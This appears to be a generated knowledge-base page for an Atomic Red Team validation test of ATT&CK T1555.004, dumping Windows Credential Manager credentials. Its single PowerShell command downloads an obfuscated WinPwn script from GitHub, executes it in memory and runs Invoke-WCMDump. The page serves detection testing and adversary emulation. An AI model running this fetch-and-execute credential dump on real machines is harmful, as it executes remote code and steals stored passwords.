---
atomic_guid: "fa714db1-63dd-479e-a58e-7b2b52ca5997"
title: "WinPwn - Loot local Credentials - Invoke-WCMDump"
framework: "atomic"
generated: "true"
attack_technique_id: "T1555.004"
attack_technique_name: "Credentials from Password Stores: Windows Credential Manager"
source_url: "https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.004/T1555.004.yaml"
build_date: "2026-04-26 17:02:13"
executor: "powershell"
aliases:
  - "fa714db1-63dd-479e-a58e-7b2b52ca5997"
  - "WinPwn - Loot local Credentials - Invoke-WCMDump"
platforms:
  - "windows"
tags:
  - "atomic"
  - "validation-test"
---

[[index|Home]] • [[kb/attack/index|ATT&CK]] • [[kb/tools/index|Tools]] • [[kb/defend/index|D3FEND]] • [[kb/car/index|CAR]] • [[kb/sigma/index|Sigma]] • [[kb/atomic/index|Atomic]] • [[workspaces/index|Notes]]

# WinPwn - Loot local Credentials - Invoke-WCMDump

Loot local Credentials - Invoke-WCMDump technique via function of WinPwn

## Metadata

- Atomic GUID: fa714db1-63dd-479e-a58e-7b2b52ca5997
- Technique: T1555.004: Credentials from Password Stores: Windows Credential Manager
- Platforms: windows
- Executor: powershell
- Source Path: atomics/T1555.004/T1555.004.yaml

## ATT&CK Mapping

- [[kb/attack/techniques/T1555-credentials_from_password_stores|T1555.004]]

## Executor

- name: powershell

### Command

```powershell
iex(new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/obfuscatedps/DumpWCM.ps1')
Invoke-WCMDump
```

## Source

- [Source YAML](https://github.com/redcanaryco/atomic-red-team/blob/master/atomics/T1555.004/T1555.004.yaml)
